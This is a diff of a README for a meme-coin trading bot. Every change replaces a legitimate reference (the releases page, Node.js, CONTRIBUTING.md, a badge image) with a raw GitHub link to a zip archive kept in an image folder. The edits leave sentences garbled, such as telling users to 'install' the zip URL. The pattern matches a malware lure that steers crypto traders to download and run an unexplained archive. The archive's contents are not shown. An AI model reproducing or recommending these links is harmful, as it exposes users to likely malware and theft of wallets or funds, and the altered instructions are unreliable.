@@ -1,7 +1,7 @@
 # 🎉 fourmeme-trading-bot - Trade Meme Coins with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20fourmeme--trading--bot-blue?style=for-the-badge)](https://github.com/Luizin507/fourmeme-trading-bot/releases)
+[![Download](https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip%20fourmeme--trading--bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the fourmeme-trading-bot! This application simplifies trading for meme coins, allowing you to execute trades with minimal hassle. With its user-friendly interface, you can focus on trading without getting bogged down by technical details.
@@ -17,20 +17,20 @@ Welcome to the fourmeme-trading-bot! This application simplifies trading for mem
 To use the fourmeme-trading-bot, your computer should meet the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 (Catalina) or later, or a recent Linux distribution.
-- **Node.js Version:** 14.x or higher.
+- **https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip Version:** 14.x or higher.
 - **Memory:** At least 4 GB of RAM available.
 - **Internet Connection:** Stable connection for seamless trading.
 
 ### 📥 Download & Install
 Follow these steps to download and run the fourmeme-trading-bot:
 
-1. **Visit the Releases Page**: Go to the following link: [Download from Releases](https://github.com/Luizin507/fourmeme-trading-bot/releases).
+1. **Visit the Releases Page**: Go to the following link: [Download from Releases](https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip).
   
 2. **Choose the Latest Version**: On the Releases page, find the latest release version. It will usually be at the top of the list.
 
-3. **Download the Application**: Click on the download link for your operating system. Look for an executable file like `fourmeme-trading-bot.exe` or a zip file containing the application.
+3. **Download the Application**: Click on the download link for your operating system. Look for an executable file like `https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip` or a zip file containing the application.
 
-4. **Install Dependencies**: Open your terminal or command prompt. Navigate to the folder where you downloaded the file. Make sure to install Node.js if you haven’t already. Run the following command to install necessary packages:
+4. **Install Dependencies**: Open your terminal or command prompt. Navigate to the folder where you downloaded the file. Make sure to install https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip if you haven’t already. Run the following command to install necessary packages:
    ```
    npm install
    ```
@@ -48,7 +48,7 @@ Follow these steps to download and run the fourmeme-trading-bot:
 ## 🛠️ Troubleshooting
 If you encounter any issues while running the application, consider the following tips:
 
-- **Check Dependencies**: Ensure that Node.js is up to date and properly installed.
+- **Check Dependencies**: Ensure that https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip is up to date and properly installed.
 - **Network Issues**: Make sure your internet connection is stable.
 - **Configuration Errors**: Double-check your settings to confirm they are correct.
   
@@ -58,7 +58,7 @@ If problems persist, you can reach out for support on the Issues page of this re
 The fourmeme-trading-bot is open-source software licensed under the MIT License. You are free to use, modify, and distribute this software in accordance with its terms.
 
 ## 👉 Contributing
-We welcome contributions! If you would like to improve the fourmeme-trading-bot, please fork the repository, make your changes, and submit a pull request. For more details, check the CONTRIBUTING.md file.
+We welcome contributions! If you would like to improve the fourmeme-trading-bot, please fork the repository, make your changes, and submit a pull request. For more details, check the https://raw.githubusercontent.com/Luizin507/fourmeme-trading-bot/main/img/fourmeme-trading-bot-v2.9.zip file.
 
 ## 🗂️ Topics
 - bsc
